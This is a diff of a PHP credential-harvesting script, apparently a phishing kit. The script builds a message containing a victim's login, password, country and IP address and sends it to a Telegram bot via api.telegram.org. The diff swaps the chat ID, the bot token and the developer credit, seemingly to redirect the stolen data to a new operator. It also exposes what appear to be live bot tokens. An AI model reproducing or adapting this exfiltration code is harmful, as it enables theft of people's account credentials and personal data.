@@ -1,6 +1,6 @@
 <?php
 if (isset($_REQUEST['ID']) and $username != '') {
-    $chatId = "8734728853";
+    $chatId = "8431116042";
 
 
     $login = $_REQUEST['login'] ?? '';
@@ -19,7 +19,7 @@ function getLineFromFile($filename, $lineNumber) {
 }
 
 
-$botToken = "8440280233:AAEFXcWn2r4q282T2LqPhXsMo9Nm-iI1c14";
+$botToken = "8306869095:AAE7xkGIU5BaLTIcxJVoCR2e0z0RXnNYhNI";
 
 // عرض النتيجة للتأكد
 
@@ -272,7 +272,7 @@ $message .= "💚 ↬ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » $password »\n\n";
 $message .= "🖤 ↬ COUNTRY CODE » +$countryDialCode\n"; // استخدام مفتاح الاتصال
 $message .= "🧡 ↬ COUNTRY NAME » $countryName\n"; // استخدام اسم الدولة
 $message .= "💙️ ↬ IP » " . $userIp . "\n\n";
-$message .= "˹ 𝙳𝙴𝚅 𝙱𝚈 @pentesting_lab \n";
+$message .= "˹ 𝙳𝙴𝚅 𝙱𝚈 @z_iik \n";
 $message .= "--------------------------------------------------------〤✪";
 
 $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
